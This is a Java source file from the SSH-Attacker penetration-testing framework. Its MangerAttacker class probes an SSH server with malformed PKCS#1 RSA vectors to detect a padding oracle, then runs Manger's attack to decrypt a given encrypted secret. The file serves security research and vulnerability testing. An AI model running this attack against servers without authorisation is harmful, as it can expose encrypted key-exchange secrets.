/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */

package de.rub.nds.sshattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.KeyFetcher;
import de.rub.nds.sshattacker.attacks.ParallelExecutor;
import de.rub.nds.sshattacker.attacks.config.MangerCommandConfig;
import de.rub.nds.sshattacker.attacks.exception.AttackFailedException;
import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
import de.rub.nds.sshattacker.attacks.pkcs1.Manger;
import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1Vector;
import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1VectorGenerator;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.attacks.response.EqualityErrorTranslator;
import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
import de.rub.nds.sshattacker.attacks.task.SshTask;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.Bits;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.state.State;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

/**
 * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses. In case there are
 * differences in the server responses, it is very likely that it is possible to execute Bleichenbacher attacks.
 */
public class MangerAttacker extends Attacker<MangerCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;

    private boolean increasingTimeout = true;

    private long additionalTimeout = 1000;

    private long additionalTcpTimeout = 5000;

    private List<VectorResponse> fullResponseMap;

    private EqualityError resultError;

    private final ParallelExecutor executor;

    private boolean shakyScans = false;
    private boolean erroneousScans = false;

    /**
     *
     * @param mangerConfig
     * @param baseConfig
     */
    public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig) {
        super(mangerConfig, baseConfig);
        sshConfig = getSshConfig();
        executor = new ParallelExecutor(1, 3);
    }

    /**
     *
     * @param mangerConfig
     * @param baseConfig
     * @param executor
     */
    public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig,
                          ParallelExecutor executor) {
        super(mangerConfig, baseConfig);
        sshConfig = getSshConfig();
        this.executor = executor;
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        CONSOLE
            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
        CONSOLE.info("A server is considered secure if it always responds the same way.");
        EqualityError referenceError;
        fullResponseMap = new LinkedList<>();
        try {
            for (int i = 0; i < config.getNumberOfIterations(); i++) {
                List<VectorResponse> responseMap = createVectorResponseList();
                this.fullResponseMap.addAll(responseMap);
            }
        } catch (AttackFailedException e) {
            CONSOLE.info(e.getMessage());
            return null;
        }
        referenceError = getEqualityError(fullResponseMap);
        if (referenceError != EqualityError.NONE) {
            CONSOLE.info("Found a behavior difference within the responses. The server could be vulnerable.");
        } else {
            CONSOLE
                .info("Found no behavior difference within the responses. The server is very likely not vulnerable.");
        }

        CONSOLE.info(EqualityErrorTranslator.translation(referenceError, null, null));
        if (referenceError != EqualityError.NONE || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
            LOGGER.debug("-------------(Not Grouped)-----------------");
            for (VectorResponse vectorResponse : fullResponseMap) {
                LOGGER.debug(vectorResponse.toString());
            }
        }

        resultError = referenceError;
        return referenceError != EqualityError.NONE;
    }

    /**
     *
     * @return
     */
    public List<VectorResponse> createVectorResponseList() {
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }
        List<SshTask> taskList = new LinkedList<>();
        List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();

        //TODO: hash length is dependent on key exchange algorithm
        for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, 256)) {

            State state = new State(sshConfig, MangerWorkflowGenerator.generateWorkflow(sshConfig, vector.getEncryptedValue()));

            FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
                executor.getReexecutions(), additionalTcpTimeout);

            taskList.add(fingerPrintTask);
            stateVectorPairList.add(new FingerprintTaskVectorPair(fingerPrintTask, vector));
        }
        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
        executor.bulkExecuteTasks(taskList);
        for (FingerprintTaskVectorPair pair : stateVectorPairList) {
            ResponseFingerprint fingerprint;
            if (pair.getFingerPrintTask().isHasError()) {
                erroneousScans = true;
                LOGGER.warn("Could not extract fingerprint for " + pair);
            } else {
                fingerprint = pair.getFingerPrintTask().getFingerprint();
                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
            }
        }
        return tempResponseVectorList;
    }

    /**
     * This assumes that the responseVectorList only contains comparable vectors
     *
     * @param  responseVectorList
     * @return
     */
    public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {

        for (VectorResponse responseOne : responseVectorList) {
            for (VectorResponse responseTwo : responseVectorList) {
                if (responseOne == responseTwo) {
                    continue;
                }
                EqualityError error =
                    FingerPrintChecker.checkEquality(responseOne.getFingerprint(), responseTwo.getFingerprint());
                if (error != EqualityError.NONE) {
                    CONSOLE.info("Found an EqualityError: " + error);
                    LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
                    LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
                    return error;
                }

            }
        }
        return EqualityError.NONE;
    }

    public RSAPublicKey getServerPublicKey() {
        RSAPublicKey publicKey = KeyFetcher.fetchRsaTransientKey(sshConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info(String.format("Fetched server public key with exponent %s and modulus: %s",
                publicKey.getPublicExponent().toString(16), publicKey.getModulus().toString(16)));
        return publicKey;
    }

    @Override
    public void executeAttack() {
        //TODO: make attack work
        if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedSecret() == null) {
            throw new ConfigurationException(
                "The encrypted secret must be set to be decrypted.");
        }

        LOGGER.info("Fetched the following server public key: " + publicKey);
        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        if ((encryptedSecret.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException("The length of the encrypted secret "
                + "is not equal to the public key length. Have you selected the correct value?");
        }
        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getSshConfig(),
            extractValidFingerprint(publicKey), null);
        Manger attacker = new Manger(encryptedSecret, oracle);
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        CONSOLE.info(solution.toString(16));
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, 256);
        State state = new State(sshConfig, MangerWorkflowGenerator.generateWorkflow(sshConfig, vector.getEncryptedValue()));
        FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
            executor.getReexecutions(), additionalTcpTimeout);
        FingerprintTaskVectorPair stateVectorPair = new FingerprintTaskVectorPair(fingerPrintTask, vector);
        executor.bulkExecuteTasks(fingerPrintTask);
        ResponseFingerprint fingerprint = null;
        if (stateVectorPair.getFingerPrintTask().isHasError()) {
            LOGGER.warn("Could not extract fingerprint for " + stateVectorPair);
        } else {
            fingerprint = fingerPrintTask.getFingerprint();
        }
        return fingerprint;
    }

    public EqualityError getResultError() {
        return resultError;
    }

    public List<VectorResponse> getResponseMapList() {
        return fullResponseMap;
    }

    public boolean isShakyScans() {
        return shakyScans;
    }

    public boolean isErrornousScans() {
        return erroneousScans;
    }

    public boolean isIncreasingTimeout() {
        return increasingTimeout;
    }

    public void setIncreasingTimeout(boolean increasingTimeout) {
        this.increasingTimeout = increasingTimeout;
    }

    public long getAdditionalTimeout() {
        return additionalTimeout;
    }

    public void setAdditionalTimeout(long additionalTimeout) {
        this.additionalTimeout = additionalTimeout;
    }

    public long getAdditionalTcpTimeout() {
        return additionalTcpTimeout;
    }

    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
        this.additionalTcpTimeout = additionalTcpTimeout;
    }

}
